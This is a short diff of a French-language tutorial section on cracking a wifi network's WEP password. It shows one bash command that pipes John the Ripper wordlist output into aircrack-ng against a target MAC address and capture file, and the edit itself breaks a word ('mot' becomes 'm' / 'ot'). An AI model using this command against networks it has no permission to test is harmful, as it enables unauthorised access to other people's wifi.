@@ -3,8 +3,8 @@
 ## Crack le réseau WEP
 
 Rien de plus compliqué, c'est un crackage de mot de passe WEP qui a de plus simple.
-
-Un cours tutoriel pour crack le mot de passe WEP d'un réseau wifi avec john the ripper.
+m
+Un cours tutoriel pour crack le ot de passe WEP d'un réseau wifi avec john the ripper.
 
 ```bash
 $ john --wordlist=<wordlist> --stdout --session=upc1 | aircrack-ng -w - -b <target_mac> <fichier.cap>
